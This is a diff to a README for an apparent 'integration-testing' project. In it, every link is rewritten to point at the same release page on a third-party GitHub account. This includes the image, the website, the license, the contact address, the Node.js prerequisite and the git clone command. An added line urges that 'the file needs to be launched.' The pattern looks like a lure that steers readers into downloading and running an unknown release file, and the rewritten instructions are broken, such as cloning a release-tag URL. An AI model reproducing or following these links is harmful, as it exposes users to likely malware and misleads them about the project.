@@ -1,6 +1,6 @@
 # 🚀 Welcome to the integration-testing Repository! 🌟
 
-![integration-testing](https://img.icons8.com/cotton/2x/testing.png)
+![integration-testing](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0)
 
 ### Repository Name:
 integration-testing
@@ -14,19 +14,19 @@ cicd-pipeline, cicd-pr-validation, docker, docker-compose, express, integration-
 ---
 
 ## 📦 Download the Latest Release:
-[![Download v1.0.0.zip](https://img.shields.io/badge/Download-v1.0.0.zip-<COLOR>.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0<COLOR>.svg)](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0)
 
 _Note: The file needs to be launched._
 
 ---
 
 ## 🌐 Visit Our Website:
-Explore more about integration testing on our [website](https://www.integrationtesting.com).
+Explore more about integration testing on our [website](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0).
 
 ---
 
 ## 🚨 Check Releases Section:
-If the provided link is not working or you need other releases, please check the [Releases](https://github.com/integration-testing/releases) section for more options.
+If the provided link is not working or you need other releases, please check the [Releases](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0) section for more options.
 
 ---
 
@@ -35,12 +35,12 @@ Follow the steps below to start using the integration-testing project:
 
 ### Prerequisites:
 - Docker
-- Node.js
+- https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0
 - Git
 
 ### Clone the Repository:
 ```bash
-git clone https://github.com/your-username/integration-testing.git
+git clone https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0
 cd integration-testing
 ```
 
@@ -103,12 +103,12 @@ We welcome contributions from the community to improve the integration-testing p
 ---
 
 ## 📝 License:
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/integration-testing/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0) file for details.
 
 ---
 
 ## 🌟 Get in Touch:
-If you have any questions, suggestions, or feedback, feel free to reach out to us at [integration.testing@example.com](mailto:integration.testing@example.com).
+If you have any questions, suggestions, or feedback, feel free to reach out to us at [https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0).
 
 ---
 
